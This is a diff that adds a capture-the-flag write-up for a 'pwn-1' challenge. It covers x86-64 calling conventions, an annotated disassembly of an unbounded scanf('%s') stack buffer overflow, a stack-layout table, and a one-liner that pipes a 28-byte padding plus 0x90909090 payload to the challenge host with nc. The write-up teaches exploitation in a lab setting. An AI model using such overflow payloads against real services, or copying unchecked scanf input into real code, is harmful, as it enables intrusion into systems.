@@ -134,7 +134,74 @@ TBA
 
 ## pwn-1
 
-TBA
+### x86-64 calling convention (Linux)
+
+See [wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions).
+
+```
+func(rdi, rsi, rdx, rcx, r8, r9, stack...)
+
+
+func(0, 1, 2, 3, 4, 5, 6, 7);
+
+mov rdi, 0
+mov rsi, 1
+mov rdx, 2
+mov rcx, 3
+mov r8, 4
+mov r9, 5
+push 6
+push 7
+call func
+
+
+scanf(format_s, buffer);
+
+mov rdi, format_s
+mov rsi, buffer
+call scanf
+```
+
+### Analyze
+
+```
+0040071a: lea    rax,[rbp-0x20]                    // buffer
+0040071e: mov    rsi,rax
+00400721: mov    edi,0x4007fa                      // "%s"
+00400726: mov    eax,0x0
+                                                   // we have a buffer overflow vulnerability here!
+0040072b: call   4005b0 <__isoc99_scanf@plt>       // scanf("%s", buffer);
+00400730: cmp    DWORD PTR [rbp-0x4],0x90909090    // overwrite target
+00400737: jne    400745
+00400739: mov    edi,0x601080
+0040073e: call   400560 <puts@plt>                 // Key!!
+00400743: jmp    400759
+00400745: mov    eax,DWORD PTR [rbp-0x4]
+00400748: mov    esi,eax
+0040074a: mov    edi,0x400800                      // "Your point is only %d, try hard!\n"
+0040074f: mov    eax,0x0
+00400754: call   400570 <printf@plt>
+00400759: leave
+0040075a: ret
+```
+
+The stack structure:
+
+| Offset   | Content       |
+| -------- | ------------- |
+| rbp - 20 | buffer        |
+| rbp - 18 | buffer+08     |
+| rbp - 10 | buffer+10     |
+| rbp - 08 | [padding]     |
+| rbp - 04 | points        |
+| rbp      | [stack frame] |
+| rbp + 08 | [ret address] |
+
+So we need (24 + 4) bytes junk and 4bytes 0x90909090 to overwrite it.
+
+``` sh
+python2 -c 'print "A"*28 + "\x90"*4' | nc $HOST $PORT
+```
 
 ## pwn-2
 
